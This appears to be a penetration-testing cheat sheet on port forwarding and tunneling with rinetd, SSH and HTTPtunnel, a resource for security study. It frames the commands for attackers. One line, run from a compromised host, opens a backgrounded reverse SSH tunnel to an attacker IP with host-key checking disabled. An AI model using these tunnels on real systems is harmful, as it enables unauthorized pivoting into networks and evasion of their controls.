# Port Forwarding & Tunneling

## Port Forwarding

{% hint style="info" %}
Not forget to configure `network.proxy.allow_hijacking_localhost` to true within Firefox (about:config) to access on localhost a website relayed through port forwarding.
{% endhint %}

### Rinetd

```
$ cat /etc/rinetd.conf
# bindadress bindport connectaddress connectport
0.0.0.0 80 <dest_ip> 80
```

### SSH

#### Local Port Forwarding

Setup from attacker:

```
ssh -N -L [bind_address:]port:target_host:target_host_port [username@relay_host]
```

#### Remote Port Forwarding

Setup from target:

```
ssh -N -R [bind_address:]port:attacker_host:attacker_host_port [username@relay_host]
```

Setup from relay:

```
ssh -N -R [bind_address:]port:target_host:target_host_port [username@attacker_host]
```

{% hint style="info" %}
Add the following to automatically accept the host key:

`-o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no"`
{% endhint %}

{% hint style="info" %}
To avoid entering a SSH password into a compromised host, use SSH keys:

`mkdir /tmp/keys`

`ssh-keygen`

And copy the public key into attacker host's authorized keys (`~/.ssh/authorized_keys`):

`from="<target`_`ip>",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty ssh-rsa <public_key>`_` ``www-data@target`
{% endhint %}

```
ssh -f -N -R <forwarding_rule> -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /tmp/keys/id_rsa user@<attacker_ip>
```

#### Dynamic Port Forwarding

Setup from attacker: (basically setting up a proxy)

```
ssh -N -D <address to bind to>:<port to bind to> <username>@<SSH server address>
```

## Tunneling

### HTTPtunnel

Source: [http://http-tunnel.sourceforge.net/](http://http-tunnel.sourceforge.net)

Alternative: [https://www.stunnel.org/](https://www.stunnel.org)

```
# Server
hts --forward-port host:port [listen_addr:]listen_port

# Client
htc --forward-port [listen_addr]:listen_port server_addr:server_port
```
